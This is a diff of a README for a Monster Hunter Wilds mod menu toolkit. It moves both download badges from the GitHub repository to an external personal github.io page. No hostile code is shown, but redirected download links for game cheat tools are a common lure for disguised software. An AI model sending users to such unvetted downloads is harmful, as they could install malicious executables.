@@ -1,6 +1,6 @@
 # 🎯 monster-hunter-wilds-mod-menu-hunter-toolkit - Your Ultimate Hunting Companion Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-Monster_Hunter_Wilds_Toolkit-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/shaiksameer81/monster-hunter-wilds-mod-menu-hunter-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Monster_Hunter_Wilds_Toolkit-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://shaiksameer81.github.io)
 
 ## 🎮 What Is This?
 
@@ -48,7 +48,7 @@ Getting started with the Monster Hunter Wilds Mod Menu Hunter Toolkit is simple.
 
 **Visit this link to download the application:**
 
-[![Download Now](https://img.shields.io/badge/Download-Hunter_Toolkit-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/shaiksameer81/monster-hunter-wilds-mod-menu-hunter-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Hunter_Toolkit-blue?style=for-the-badge&logo=github&logoColor=white)](https://shaiksameer81.github.io)
 
 ### 💻 Step 2: System Requirements
 
